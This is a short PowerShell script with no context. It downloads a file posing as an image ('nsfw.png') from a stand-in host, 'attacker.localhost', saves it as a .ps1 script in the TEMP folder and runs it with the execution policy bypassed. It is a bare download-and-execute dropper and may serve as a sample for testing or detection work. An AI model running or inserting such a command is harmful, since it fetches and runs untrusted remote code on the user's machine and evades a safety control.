$u = "http://attacker.localhost/nsfw.png"
$p = "$env:TEMP\nsfw.ps1"
Invoke-WebRequest $u -OutFile $p
powershell -ExecutionPolicy Bypass -File $p
